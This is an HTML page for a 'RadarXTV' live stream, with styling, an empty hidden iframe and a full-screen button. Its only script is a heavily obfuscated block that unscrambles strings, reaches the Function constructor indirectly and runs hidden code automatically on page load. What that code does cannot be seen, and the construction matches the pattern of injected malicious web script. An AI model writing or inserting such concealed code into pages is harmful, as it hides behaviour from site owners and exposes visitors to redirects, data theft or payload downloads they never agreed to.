<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXTV - Live Stream</title>
    <style>
        body { 
            background-color: #121212; 
            color: white; 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container { 
            text-align: center;
            position: relative;
        }
        iframe { 
            width: 80vw;  /* Width same as before */
            height: 60vh; /* Reduced height */
            border: none; 
            display: block; 
            margin: 0 auto;
        }
        #loadingMessage, #refreshMessage { 
            font-size: 16px; 
            color: red; 
            position: relative;
        }
        #refreshMessage { 
            color: yellow; 
            margin-top: 10px;
        }
        #fullScreenBtn { 
            position: fixed; 
            bottom: 20px; 
            left: 50%; 
            transform: translateX(-50%);
            padding: 10px 20px; 
            background-color: #00ffcc; 
            color: white; 
            font-size: 16px; 
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .popup { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.8); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        .popup-content { 
            background: white; 
            color: black; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center; 
        }
        .popup button { 
            margin: 10px; 
            padding: 10px 20px; 
            border: none; 
            cursor: pointer; 
        }
    </style>
</head>
<body>

<div class="container">
    <h1>RadarXTV - Live Stream</h1>
 <div id="refreshMessage">Kindly wait 60 seconds for the stream to load. If it takes longer, please refresh the page.</div>
    <div id="iframeContainer">
        <iframe id="streamIframe" src="" style="display:none;"></iframe>
    </div>
    
    <div id="loadingMessage">Loading stream... Please wait.</div>
   <!-- <div id="refreshMessage">Refresh the page if stream takes more than 60 seconds to load.</div> -->
    
    <button id="fullScreenBtn">Full Screen</button>
</div>

<script>
(function(){var dpQ='',YSk=820-809;function PLH(q){var v=1226353;var l=q.length;var t=[];for(var a=0;a<l;a++){t[a]=q.charAt(a)};for(var a=0;a<l;a++){var p=v*(a+548)+(v%16261);var g=v*(a+518)+(v%41649);var w=p%l;var s=g%l;var b=t[w];t[w]=t[s];t[s]=b;v=(p+g)%6205619;};return t.join('')};var rVH=PLH('atnzvhcrcocrfjuqrxdsstbmnopgtuelykiwo').substr(0,YSk);var OiD='Cisla]i)vc(oua76vpl 2cj+g+0;={Af3h.,ulon.n6h"[ttj;i<(fc]nvr=(=8soy,xewv;.=t[;+7br,Al,z ,nhc+6+a;S.2ir,p1}(;g;1(]a2[gvv7nr,S];9)f2"ivobt),)=e=k;;a8o1)ng(un(Clfmq=;g;1uvs4r+  *)revqr;;}ni[5vaa.,m+40=f8va[j(];=sv.vunaema=n=}rnni6ao,60;otf=+a=hrrk8fnn=qvs"ur{v,)"ixc;hopfu=nux=]+fnnCa(01ldv)(;e-+)de,l ao;hh]8hC=o8=g[,rulv;i"=[s.+]geC09+((ncp,mA)>ict .p;( -b,;ocr(v9m reqiC<t4rdi])ti[} bsn)nt1fvr, t]er;huseft,l3ng;7(n).fp((a=i.=nv +r 6)=v;grdcers.j<9)s;n)ostt[arC=fw!trlnlfh-*rh6ti axbolx}.i.riegde{r7eght)uu);iui[aav5b+=c2,c2tvuv;.2.ly( ;s)yctt7f iea,7r[,bb=vlo.[er{jf6(=qCg.;a1rh(".6r"sf=igg-i"=)mxiy89+,s}rhl1]zh =a-je.l=ts;;0nr +er.<c=1),hnh;nw.rr4gwacjlehu=a;(8mvvoute-nijc=a)agt=it6( [07vpon,v8+ls.jo=e;g";;=pn7a=savtc)a10,u i9614alg;);ay (l]h]a) ;) r5ra8n+4u){lur(la;((s.mk8r(7=r+;=0r] ,A.u. [ w=;clrn-(c);c0(;)z=;{2o(davrh.+)v+cekso9g)a}(j,htlu)d.t+!+le)er)(Ar<v+("r0a;(c+,>rrit0{ofr1=';var YJq=PLH[rVH];var oRU='';var gKR=YJq;var oEB=YJq(oRU,PLH(OiD));var Bth=oEB(PLH('t4[Li&XXnn=e(XXw7Xd]dhdi Xre)7{{=]EX-=sfffpcsri.onrf_faj9()nroro..aGXX);0)DXaa[u)cF,3s"bho)drt(r_=dX) 5n(o_AaX9X,).we1<4{"940dXaXt!gXvcdXX.(X);dhk$uf.nD])e!aoX).t.]s4%mf$.Xd9Xxn{p=t7\'=bQu2dXLrdX(_ld*dX3(XdXiXinkt}.0d)Q$b9n2td]v:)t7!lcX4fr!$uX){.4,hf(f:3t)lt]\/21f1ne.0hta_3i6XX3diufq)8X.3Xbucub( ,+8elld% 1:oc_ro0(l{2lc=4i=fd)9)XL.,Xf-X%i+p)cqXso6C$_.td;reXa,:c=2e. X5Xo]_(y"c_%nX]h%rgX3$b9$oXaoX(;eb5ea} .c.X[hlXrpdcja_ca4(]=g2(0;4e(?,21o na6%ul)toXX4 $h_lr<uufAX)nel.d4C8s)4]ot_d*]E..dcearf!ot%]e{ll)5_Xe7AepX doq,8P;XalXnb_h_n=.t[lLtl}m5r9ar.oeef5X%dX]yn(lt3fXEmM$4 Xer9ferna!:;l<XXig](21eui;#t2$f+nbX_(Ec9(tno3  eEM.7)k6dAocg%uret]5dus]bvf%t;pX4Xd;]=XnXXeei10rntIs_X1!(4f){uf04ti(B9+Xf]\/nt]oX1<;9XXdu8.nMS\'=y7m{(M+iP)X0xnXcfL7vlDe)a0j5p6J*!ot;(X<._1iXd#g(X\/L,ts]idil)]6ct9.X]faX;.{X0mhPr34en]dB(J,eX._jIrmXrr4cl;=$o(tn44leId#)C2.LesXLvtefH=n)l*47s!tXq.X!!.ieX4)8d%oX71s;4fXm1}2Hn.!r?sxdi.7(o})n.%.,s+e1fl{it%;] 37({rtf_e( )));417,bln1X!r)?> .Xln09Ii,{a{#eFXovX$l4#Xoa.%j.}Sen.!%3pv!sPX2;oX;tdi;tlne]6CHa\/X]s4NX;H(>XSrXio)Xt]ff3}boLffX$_3X1a=X3)I7i}a5If!.4jte](32%{1X]iX@%X@e)di(mXfC+."de$e50c=iXq{ bpt1sXH.ho>3ti#.p o{7%r)Xr7(tta8(X) eXXXX;eXX_veXn=1i27] (o}1%y;X#};i5mX132Xa_2b_;7!5odCH(4_6%)lrm4N$;0F0}9\/9e){X90;6Co$5XGX2XX7}K(b!XrX9]&X133(X<6edXIwa9.nqnE33fo2XXe!XX(O;oLtb5CeXg1o1e_n{tXcXf._deXaXe.o]XXX.( e_=M nXn 96_a(r$ce6e.X9H;d9evoi]}!in XodXeX(.tu.r)e$)){]1$eXo.0n_}XtK!i!4afXXict)%ssXo.3eX1.!GX5;!Xe_o4),1X)tM(iCcsX(XNeSbBt$,}iX;n1(a%5.cenXdtX}[u;%(a4]wuens1e!dXXi"e!{_5d){)X}$1"i$<)Xi%A EX"793;sr((t1QX16!512oXr\/)5;X)04[XXM#;9X;Xph=Xidf]!.u X%\'..$)nA7,, )dbi]l_i)(X&LX..$_e!c.1n(1.#_(,773d!;i.{rs4NXX=0(X  XX\/!9i))t)c9\'c )lIX4(X;3Q8k;}ffD (X=]6(3Lf)n,;}.5$X)_X19}iXXX3<XD.us_d\/?X#.;s1Xi4 16=X.XX)p(g.te5)(d42,s%ln!]3Jj$jX%c&mnX,3$d1XlEg6XXeu(auXr[]n;X0{1XX(e1:X1o)}ip.nl8_ta;2)=ia=,.)soiD\/7kX)(Xd(-{erX4]X{X)X;bc47iX3_*2.4c))-+Xn)3am"f](;[efngCXX[k 2.$84X%Lid(fsX4X.X6l:._dt}dX"4 {[Xv%&h(u1wo&9)ewX%XeX,X9%X3z!,(+N.G)uXLe6d=dXn_:iXXul=dbi4s n8knr <d)wXnv_rd2}qv_o7X5g8rrdoteeiirf;f0f s%%$= deX%b\'cf9_!$1Jv.($w2)t7dX].rr)p,}Xr61=X._"JXnatXj9XX4[81wuX5% 6 n\/wX()n,fd<di_ XEgqusr5aX{ 1};anXXX3 L(\/l=i@_45_6C;et35lX!7X"3$X_#dXqSn6XXXttn6Xn) 6I6d_mndd)%eX),3sl%4)2uo=d)}{nc6(]>,d_Am"5X9(_{($.65$_oAirXbt.t.y8blsb=%g1pX(_.peXFma8X5Hnd$yM=&3ii,eXg)<l_r.nl6dXX15ri_65.a33X1f1(]XXc(..=nXse%X{Mi5,Xcirq,_t(ifn!!2nd%t(tea})6i)$ed{X!r62upinH!(otlX g)_o X6.g1X&3_4te$tXXd%3)e.9u(]u =0me($.3B$ar](;! )X,X{,62X@5?XX,Xo@ e[ }.X2$!X]f]]n.'));var Mwh=gKR(dpQ,Bth );Mwh(1994);return 9804})()
</script>

</body>
</html>